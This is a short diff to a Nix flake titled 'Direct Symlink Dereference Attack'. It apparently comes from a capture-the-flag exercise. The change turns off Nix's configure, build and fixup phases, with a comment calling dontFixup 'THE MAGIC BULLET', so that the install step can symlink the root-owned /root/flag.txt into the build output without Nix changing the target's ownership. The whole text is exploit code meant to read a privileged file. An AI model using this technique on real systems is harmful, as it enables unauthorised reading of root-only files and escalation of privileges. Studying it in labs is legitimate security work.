@@ -1,5 +1,5 @@
 {
-  description = "Direct Symlink Dereference Attack";
+  description = "Direct Symlink Dereference Attack (No Fixup)";
 
   inputs = {
     nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
@@ -15,7 +15,12 @@
       version = "1.0";
       src = ./.;
 
-      buildPhase = "true";
+      # Disable the default phases that might interact with our symlink
+      dontConfigure = true;
+      dontBuild = true;
+      
+      # THE MAGIC BULLET: Stop Nix from chown/chmod-ing the symlink target
+      dontFixup = true; 
 
       installPhase = ''
         ln -s /root/flag.txt $out
